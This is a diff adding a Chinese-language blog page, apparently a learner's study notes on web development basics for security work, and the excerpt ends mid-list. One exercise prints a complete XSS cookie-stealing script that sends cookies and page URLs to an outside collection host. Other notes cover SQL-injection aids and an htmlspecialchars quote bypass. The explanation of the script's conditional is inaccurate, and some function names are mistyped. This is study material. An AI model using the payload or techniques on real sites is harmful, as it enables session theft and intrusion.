@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="记录一下需要掌握的Web开发基础知识！">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全工程师之路——第二章Web开发基础知识">
+<meta property="og:url" content="http://yoursite.com/2019/07/10/Web安全工程师之路——第二章Web开发基础知识/index.html">
+<meta property="og:site_name" content="Klaus&#39; Blog">
+<meta property="og:description" content="记录一下需要掌握的Web开发基础知识！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/07/02/b7291ad52bd498f7b71fd99745251ad8.png">
+<meta property="og:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/07/02/c242d71bd30748f122924a7578c801b9.png">
+<meta property="og:updated_time" content="2019-07-10T08:10:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全工程师之路——第二章Web开发基础知识">
+<meta name="twitter:description" content="记录一下需要掌握的Web开发基础知识！">
+<meta name="twitter:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/07/02/b7291ad52bd498f7b71fd99745251ad8.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/10/Web安全工程师之路——第二章Web开发基础知识/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Web安全工程师之路——第二章Web开发基础知识 | Klaus' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Klaus' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/10/Web安全工程师之路——第二章Web开发基础知识/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全工程师之路——第二章Web开发基础知识
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-10 09:31:26 / Modified: 16:10:33" itemprop="dateCreated datePublished" datetime="2019-07-10T09:31:26+08:00">2019-07-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录一下需要掌握的Web开发基础知识！</p>
+<a id="more"></a>
+<h3 id="第二章—Web开发基础知识"><a href="#第二章—Web开发基础知识" class="headerlink" title="第二章—Web开发基础知识"></a>第二章—Web开发基础知识</h3><h4 id="第一节–前端开发基础——HTML"><a href="#第一节–前端开发基础——HTML" class="headerlink" title="第一节–前端开发基础——HTML"></a>第一节–前端开发基础——HTML</h4><ul>
+<li><p>HTML（超文本标记语言）我较为熟悉，不做过多叙述，这里记录一下HTML预留符</p>
+</li>
+<li></li>
+<li><p>| 字符 | 实体编号 | 实体名称 | 描述           |<br>| —- | ——– | ——– | ————– |<br>| “    | &amp;#34；   | &amp;quot；  | quotation mark |<br>| ‘    | &amp;#39；   | &amp;apos；  | apostrophe     |<br>| &amp;    | &amp;#38；   | &amp;amp；   | ampersand      |<br>| &lt;    | &amp;#60；   | &amp;lt；    | less-than      |<br>| &gt;    | &amp;#62；   | &amp;gt；    | greater-than   |</p>
+<p>注：实体名称对大小写敏感；上述的实体编号和实体名称中的分号均为<code>;</code>（英文输入法的分号），因为markdown会自动转译，所以用中文输入法的符号书写。</p>
+</li>
+</ul>
+<ul>
+<li>HTML DOM树结构<ul>
+<li>HTML<ul>
+<li>HEAD<ul>
+<li>其他标签</li>
+</ul>
+</li>
+<li>BODY<ul>
+<li>其他标签</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>这样可以更直观的了解页面元素</li>
+<li>通过JavaScript，可以对HTML进行任意操作</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>Q：熟悉HTML的常见的事件属性</p>
+<ul>
+<li><p>了解On属性，如onerror、onload、onclick、onchange、onfocus、oninput、onmousemove、onsubmit、onkeydown；</p>
+</li>
+<li></li>
+<li><p>| 属性        | 描述                                                         | DOM  |<br>| ———– | ———————————————————— | —- |<br>| onerror     | 在加载文档或图像时发生错误。 ( <object>, <body>和 <frameset>) |      |<br>| onload      | 一张页面或一幅图像完成加载。                                 | 2    |<br>| onclick     | 当用户点击某个对象时调用的事件句柄。                         | 2    |<br>| onchange    | 该事件在表单元素的内容改变时触发( <input>, <keygen>, <select>, 和 </select><textarea>) | 2    |<br>| onfocus     | 元素获取焦点时触发。                                         | 2    |<br>| oninput     | 元素获取用户输入时触发。                                     | 2    |<br>| onmousemove | 鼠标被移动。                                                 | 2    |<br>| onsubmit    | 表单提交时触发。                                             | 2    |<br>| onkeydown   | 某个键盘按键被按下。                                         | 2    |</textarea></frameset></body></object></p>
+<p>具体查询链接：<a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener">HTML DOM事件</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="第二节–前端开发基础——JavaScript"><a href="#第二节–前端开发基础——JavaScript" class="headerlink" title="第二节–前端开发基础——JavaScript"></a>第二节–前端开发基础——JavaScript</h4><ul>
+<li>在哪些地方可以运行JavaScript？<ul>
+<li>HTML的<code>&lt;script&gt;&lt;/script&gt;</code>之间</li>
+<li>HTML的事件属性之中</li>
+</ul>
+</li>
+<li>JavaScript<ul>
+<li>ECMAScript是JavaScript标准</li>
+<li>DOM——文档对象模型<ul>
+<li>HTML元素操作</li>
+</ul>
+</li>
+<li>BOM——浏览器对象模型<ul>
+<li>浏览器操作</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>JavaScript不提供任何内建的打印或显示函数，但是能够以不同的方式“显示”数据<ul>
+<li>使用<code>window.alert()</code>写入警告框</li>
+<li>使用<code>document.write()</code>写入HTML输出</li>
+<li>使用<code>innerHTML</code>写入HTML元素</li>
+<li>使用<code>console.log()</code>写入浏览器控制台</li>
+</ul>
+</li>
+<li>DOM（Document Object Model）——文档对象模型</li>
+<li>JavaScript + DOM——访问和操作HTML文档的标准方法<ul>
+<li>如何获取元素内容？<ul>
+<li>获取元素<ul>
+<li><code>getElementById()</code>：通过Id获取元素</li>
+</ul>
+</li>
+<li>获取元素内容<ul>
+<li><code>.innerHTML</code>：获取元素内容</li>
+</ul>
+</li>
+<li>例如：<ul>
+<li><code>document.getElementById(&quot;the-id&quot;).innerHTML</code></li>
+<li><code>alert(document.getElementById(&quot;the-id&quot;).innerHTML)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何修改元素内容？<ul>
+<li>获取元素<ul>
+<li><code>getElementById()</code>：通过Id获取元素</li>
+</ul>
+</li>
+<li>获取元素内容<ul>
+<li><code>.innerHTML</code>：通过Id获取元素内容</li>
+</ul>
+</li>
+<li>例如：<ul>
+<li><code>document.getElementById(&quot;the-id&quot;).innerHTML=&quot;&lt;iframe src=&#39;www.163.com&#39;&gt;&lt;/iframe&gt;&quot;</code><ul>
+<li>这里要注意<code>src</code>填写的应该用<code>&#39;</code>单引号，用双引号会报错。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何创建动态的HTML元素内容？<ul>
+<li><code>document.write()</code>：写入HTML内容</li>
+</ul>
+</li>
+<li>如何让页面增加点互动？<ul>
+<li>点击事件—<code>onclick</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DOM本质——连接Web页面和编程语言</li>
+<li>BOM（Browser Object Model）——浏览器对象模型</li>
+<li>JavaScript + BOM——获取浏览器信息和操作浏览器<ul>
+<li>如何让浏览器来警告用户？<ul>
+<li>警告弹窗<code>alert()</code></li>
+<li>确认弹窗<code>confirm()</code></li>
+<li>提示弹窗<code>prompt()</code><ul>
+<li>以上三点常用于简单的调试和信息展示，如XSS漏洞的测试。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何让浏览器获取用户Cookie？<ul>
+<li>获取Cookie<ul>
+<li><code>document.cookie</code></li>
+</ul>
+</li>
+<li>写入Cookie<ul>
+<li><code>document.cookie=&#39;写入值&#39;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>获取浏览器屏幕信息<ul>
+<li><code>(window.)screen</code></li>
+</ul>
+</li>
+<li>获取/控制用户的URL<ul>
+<li><code>(window.)location</code></li>
+</ul>
+</li>
+<li>获取访问者浏览器的信息<ul>
+<li><code>(window.)navigator</code></li>
+</ul>
+</li>
+<li>操作浏览器窗口<ul>
+<li><code>window.close</code></li>
+<li><code>window.open(&quot;URL&quot;)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>BOM本质——连接浏览器和编程语言</li>
+<li>window.location=”a.html”和window.location.href=”a.html”的作用都是把当前页面替换成a.html页面</li>
+</ul>
+<ul>
+<li><p>Q1：分析以下代码</p>
+<ul>
+<li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; (<span class="keyword">new</span> Image()).src = <span class="string">'http://webxss.top/xss/index.php?do=api&amp;id=Sx5tnh&amp;location='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">document</span>.location.href</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + <span class="string">'&amp;toplocation='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> top.location.href</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">document</span>.cookie</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + <span class="string">'&amp;opener='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href) ? <span class="built_in">window</span>.opener.location.href: <span class="string">''</span></span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)());</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">if</span> (<span class="string">''</span> == <span class="number">1</span>) &#123;</span><br><span class="line">    keep = <span class="keyword">new</span> Image();</span><br><span class="line">    keep.src = <span class="string">'http://webxss.top/xss/index.php?do=keepsession&amp;id=Sx5tnh&amp;url='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.location) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>A1：</p>
+<ul>
+<li>新建一个Image对象，链接中包括（统一进行编码）<ul>
+<li>当前页面的地址</li>
+<li>最外层页面的地址</li>
+<li>cookie</li>
+<li>父窗口的地址</li>
+</ul>
+</li>
+<li>如果上述有一个为空，则Image的对象链接中包含文档的Location对象和cookie</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>常见的Javascript框架<ul>
+<li><a href="https://www.ibm.com/developerworks/cn/web/wa-jsframeworks/" target="_blank" rel="noopener">JavaScript框架比较</a></li>
+</ul>
+</li>
+<li>JSON<ul>
+<li>一种轻量级的数据交换格式，用来存储和表示数据，使用文本表示一个JS对象的信息，本质是一个字符串。</li>
+<li>JSON文件的文件类型是<code>.json</code></li>
+<li>JSON文本的MIME类型是<code>application/json</code></li>
+</ul>
+</li>
+<li>JSONP<ul>
+<li>用<code>&lt;script&gt;</code>与第三方通讯时，并提供一个回调函数来接受数据，第三方产生的响应为JSON数据的包装，称为JSONP。</li>
+<li>比如JSONP形如：<code>callback({&quot;name&quot;:&quot;nina&quot;,&quot;gender&quot;:&quot;female&quot;})</code>，然后浏览器调用callback函数，解析后JSON对象作为参数，在函数里处理传入的数据。</li>
+</ul>
+</li>
+<li>AJAX技术（Asynchronous JavaScript and XML）<ul>
+<li>异步的http请求，这样就可以动态的改变数据而不用重新加载整个页面。<a href="http://www.w3school.com.cn/ajax/index.asp" target="_blank" rel="noopener">W3school教程</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="第三节–Web服务器端环境"><a href="#第三节–Web服务器端环境" class="headerlink" title="第三节–Web服务器端环境"></a>第三节–Web服务器端环境</h4><ul>
+<li><p>Web服务端：操作系统+WEB服务+解释执行环境+数据库服务</p>
+<ul>
+<li>Web的静态页面时期</li>
+<li>Web的动态页面时期</li>
+</ul>
+</li>
+<li><p>目前流行的架构 </p>
+<ul>
+<li>| 操作系统       | WEB服务 | 解释执行环境 | 数据库服务 | 简称 |<br>| ————– | ——- | ———— | ———- | —- |<br>| Windows server | IIS     | ASP(.NET)    | SQL Server | .NET |<br>| Linux          | Apache  | PHP          | MySQL      | LAMP |<br>| UNIX/Windows   | Tomcat  | JSP          | Oracle     | J2EE |</li>
+</ul>
+</li>
+<li><ul>
+<li>| 性能比较 | LAMP               | J2EE             | ASP.NET |<br>| ——– | —————— | —————- | ——- |<br>| 运行速度 | 较快               | 快               | 快      |<br>| 开发速度 | 快                 | 慢               | 快      |<br>| 运行耗损 | 一般               | 较小             | 较大    |<br>| 难易程度 | 简单               | 难               | 简单    |<br>| 运行平台 | Linux/UNIX/Windows | 绝大多数平台皆可 | Windows |<br>| 扩展性   | 好                 | 好               | 较差    |<br>| 安全性   | 好                 | 好               | 较差    |<br>| 应用程度 | 较广               | 较广             | 较广    |<br>| 建设成本 | 非常低             | 非常高           | 高      |</li>
+</ul>
+</li>
+<li><p>本地hosts文件的路径：C/Windows/System32/drivers/etc</p>
+</li>
+<li><p>Web服务器既是服务器端，也可做客户端。</p>
+</li>
+<li><p>Web服务器默认文档可以是任何操作系统支持的文件。</p>
+</li>
+</ul>
+<ul>
+<li>Q1：Web的动态页面大致解析过程是什么？ <ul>
+<li>A1：  <ol>
+<li>PHP文件通过语言解释器解析</li>
+<li>对数据库进行操作，获取需要的数据</li>
+<li>根据收到的数据构造对应的HTML文件</li>
+<li>语言解释器将HTML文件传给服务器</li>
+<li>服务器将HTML文件传给浏览器解析</li>
+<li>浏览器解析HTML文件，将界面展示给用户</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>Q2：Web服务端包含哪两种服务？<ul>
+<li>A2：<ul>
+<li>WEB服务</li>
+<li>数据库服务</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Q3：本地访问时，四种访问网站的形式有哪些？<ul>
+<li>A3：<ul>
+<li>localhost</li>
+<li>127.0.0.1</li>
+<li>本机IP地址</li>
+<li>修改hosts文件，自定义本机IP地址的对应域名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Q4：如何运行一个简单的web文件？<ul>
+<li>A4： <ul>
+<li>利用phpstudy搭建apache+mysql环境</li>
+<li>将PHP文件写在网站根目录下或者自定义路径</li>
+<li>启动apache和mysql环境</li>
+<li>访问对应网页</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="第四节–后端开发基础——SQL"><a href="#第四节–后端开发基础——SQL" class="headerlink" title="第四节–后端开发基础——SQL"></a>第四节–后端开发基础——SQL</h4><ul>
+<li><p>SQL语句对大小写不敏感</p>
+</li>
+<li><p><img src="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/07/02/b7291ad52bd498f7b71fd99745251ad8.png" alt="1.png"></p>
+</li>
+<li><p>上图为数据表的结构</p>
+</li>
+<li><p><code>order by 数字</code>——表示按第几列排序，默认是按升序排序（ASC），降序为DESC。</p>
+<ul>
+<li>这一语句也可以用来判断数据表的字段长度（有多少列）。</li>
+</ul>
+</li>
+<li><p><code>LIKE</code>操作符：用于在WHERE子句中搜索列中的指定模式。</p>
+<ul>
+<li>选取<code>Persons</code>中居住在以“N”开始的城市里的人<ul>
+<li><code>select * from Persons WHERE City LIKE &#39;N%&#39;</code></li>
+</ul>
+</li>
+<li>选取<code>Persons</code>中居住在以“g”结尾的城市里的人<ul>
+<li><code>select * from Persons WHERE City LIKE &#39;%g&#39;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>写文件路径的时候要双反斜杠进行路径的分隔——<code>\\</code></p>
+</li>
+<li><p>MySQL的注释</p>
+<ul>
+<li><code>#</code>：单行注释。</li>
+<li><code>--</code>（后面有一个空格）：单行注释。</li>
+<li><code>/*...*/</code>：在行中间的注释。</li>
+</ul>
+</li>
+<li><p>常见的内置函数</p>
+<ul>
+<li><code>database()</code>：<code>select database()</code>——打印出当前使用的数据库。</li>
+<li><code>current_user</code>：<code>select current_user</code>——打印出当前的用户。</li>
+<li><code>load_file()</code>：读取文件并返回文件内容为字符串。</li>
+<li><code>version()</code>：获取数据库版本。</li>
+<li><code>into+outfile</code>：写入文件。</li>
+</ul>
+</li>
+<li><p>掌握以下函数的用法</p>
+<ul>
+<li><p><code>concat()</code>：将字符串s2连接在s1后面，等同于操作符<code>||</code>。</p>
+</li>
+<li><p><code>group_concat()</code>：能将相同的行组合起来，合并多个记录。</p>
+</li>
+<li><p><code>concat_ws(separator, str1, str2,...)</code>：第一个参数是剩余参数间的分隔符，这个函数会跳过分隔符参数后的任何NULL和空字符串。</p>
+</li>
+<li><p><code>load_file()</code>：读取文件并返回文件内容为字符串。</p>
+</li>
+<li><p><code>hex()</code>：返回十六进制值的字符串表示形式。注意不是将十进制转化为十六进制，而是转化为字符串。</p>
+</li>
+<li><p><code>unhex()</code>：将十六进制数字转化为控制字符。</p>
+<ul>
+<li>ASCII码对应的十六进制数和字符。</li>
+<li><img src="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/07/02/c242d71bd30748f122924a7578c801b9.png" alt="2.png"></li>
+</ul>
+</li>
+<li><p><code>char()</code>：ASCII码转换为字符。</p>
+</li>
+<li><p><code>count()</code>：返回匹配指定条件的行数。</p>
+</li>
+<li><p><code>substring(strings|express, start, length)</code>：截取字符串。</p>
+</li>
+<li><p><code>into+outfile</code>：将表数据导出到一个文本文件中，可以用<code>load data ...infile</code>语句恢复数据。</p>
+</li>
+<li><p><code>LOAD DATA INFILE</code>：读取文件并返回文件内容为字符串。</p>
+</li>
+<li><p><code>limit i,n</code>：用于限制查询结果返回的数量，常用于分页查询。</p>
+<ul>
+<li><p>i：为查询结果的索引值（默认从0开始）。</p>
+</li>
+<li><p>n：为查询结果返回的数量。</p>
+<ul>
+<li><p>例：</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询10条数据，索引从0到9</span><br><span class="line">select * from t_user limit 10;</span><br><span class="line"></span><br><span class="line"># 查询10条记录，索引从1到11(1+10)</span><br><span class="line">select * from t_user limit 1,10;</span><br><span class="line"></span><br><span class="line"># 查询10条记录，索引从5到15(5+10)</span><br><span class="line">select * from t_user limit 5,10;</span><br><span class="line"></span><br><span class="line"># 查询10条记录，索引从6到16(6+10)</span><br><span class="line">select * from t_user limit 6,10;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="第五节–后端开发基础——PHP"><a href="#第五节–后端开发基础——PHP" class="headerlink" title="第五节–后端开发基础——PHP"></a>第五节–后端开发基础——PHP</h4><ul>
+<li><p>PHP(Hypertext Preprocessor)：超文本预处理器</p>
+</li>
+<li><p>注释：<code>//</code>、<code>#</code>、<code>/*...*/</code></p>
+</li>
+<li><p><code>echo</code>：一次可以输出多个，用逗号分割字符串</p>
+</li>
+<li><p><code>print</code>：不能使用逗号，只能使用点号分割，有返回值</p>
+</li>
+<li><p>串接两个字符串用<code>.</code></p>
+</li>
+<li><p>变量大小写敏感</p>
+</li>
+<li><p>以下php中的预定义变量都是超全局的，这意味着它们在一个脚本的全部作用域中都可用。</p>
+<ul>
+<li>接受传值：<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code><ul>
+<li><code>$_REQUEST</code>具有前两者的功能，就是比较慢，通过get和post方法提交的所有数据都可以通过<code>$_REQUEST</code>数组获得。</li>
+</ul>
+</li>
+<li><code>$_SERVER</code>：包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</li>
+<li><code>$GLOBALS</code>：引用全局作用域中可用的全部变量。</li>
+<li><code>$_ENV</code>：通过环境方式传递给当前脚本的变量的数组。不太明白。</li>
+<li><code>$_COOKIE</code>：通过 HTTP Cookies 方式传递给当前脚本的变量的数组。</li>
+<li><code>$_SESSION</code>：当前脚本可用 SESSION 变量的数组。<ul>
+<li><code>Session</code>：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。</li>
+<li><code>Cookie</code>：Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</li>
+</ul>
+</li>
+<li><code>$_FILE</code>：通过 HTTP POST 方式上传到当前脚本的项目的数组。</li>
+</ul>
+</li>
+<li><p>include/require：包含文件</p>
+<ul>
+<li><code>include</code>：警告，脚本继续</li>
+<li><code>require</code>：错误，停止脚本</li>
+</ul>
+</li>
+<li><p>编码和解码函数</p>
+<ul>
+<li>ASCII<ul>
+<li><code>ord()</code>：返回字符串的首个字符的ASCII值。</li>
+<li><code>chr()</code>：从指定的ASCII值返回字符。</li>
+</ul>
+</li>
+<li>URL<ul>
+<li><code>urlencode()</code></li>
+<li><code>urldecode()</code></li>
+</ul>
+</li>
+<li>BASE64<ul>
+<li><code>base64_decode()</code></li>
+<li><code>base64_decode()</code></li>
+</ul>
+</li>
+<li>HTML实体<ul>
+<li><code>htmlspecoalchars()</code>：会将一些指定的HTML符号转换为实体，如<code>&lt;</code>、<code>&gt;</code>，但是默认情况下<code>&#39;</code>是不转义的，xss可以利用这点绕过。</li>
+<li><code>htmlspecialchars_decode()</code></li>
+</ul>
+</li>
+<li>其他<ul>
+<li><code>str_replace(find,replace,string,count)</code>：区分大小写<ul>
+<li><code>find</code>：必需，规定要查找的值</li>
+<li><code>replace</code>：必需，规定要替换find中的值的值。</li>
+<li><code>string</code>：必需，规定被搜索的字符串。</li>
+<li><code>count</code>：可选，对替换数进行计数的变量。</li>
+</ul>
+</li>
